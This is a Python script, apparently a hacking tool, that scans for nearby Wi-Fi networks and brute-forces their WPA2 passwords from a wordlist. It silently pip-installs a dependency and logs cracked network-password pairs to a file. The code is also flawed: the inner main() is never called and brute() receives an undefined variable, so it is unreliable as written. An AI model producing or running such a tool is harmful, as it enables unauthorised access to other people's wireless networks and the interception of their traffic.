import os
try:
    import pywifi
except ModuleNotFoundError:
    os.system("pip install pywifi")
from pywifi import const
from colorama import Fore

w = Fore.LIGHTWHITE_EX
r = Fore.RED
g = Fore.GREEN
m = Fore.LIGHTMAGENTA_EX
y = Fore.YELLOW
c = Fore.CYAN


import time

yes = ["y" , "yes"]
no = ["no" , "n"]


def brute(wordlist):
    ts = 15
    passwords = [x.strip("\n") for x in open(wordlist, "r").readlines()]
    def scan(face):
        face.scan()
        return face.scan_results()

    def main():
        wifi = pywifi.PyWiFi()
        inface = wifi.interfaces()[0]

        scanner = scan(inface)

        num = len(scanner)

        print(f"{r}Number of wifi found: {c}{str(num)}")

        for i, x in enumerate(scanner):
            res = test(num - i, inface, x, passwords, ts)

            if res:
                print(c + "=" * 20)
                print(f"{r}Password found : {c}{str(res)}")

                with open("avail_nearby_wifis.txt", "a") as f:
                    f.write(str(res) + "\n")

                print(c + "=" * 20)

    def test(i, face, x, key, ts):
        wifi_name = x.bssid if len(x.ssid) > len(x.bssid) else x.ssid

        print(c + f"Trying to connect to wifi {y}" + str(wifi_name))

        for n, password in enumerate(key):


            print(f"{c}Trying password {r}{str(password)} {c}{str(n)} / {g}{str(len(key))}")

            profile = pywifi.Profile()
            profile.ssid = wifi_name
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password
            # Remove all hotspot configurations
            face.remove_all_network_profiles()
            tmp_profile = face.add_network_profile(profile)
            face.connect(tmp_profile)
            code = 10
            t1 = time.time()
            while code != 0:
                time.sleep(0.1)
                code = face.status()
                now = time.time() - t1
                if now > ts:
                    break
                if code == 4:
                    face.disconnect()
                    return str(wifi_name) + "--" + str(password)
        return False

brute(wordlist)







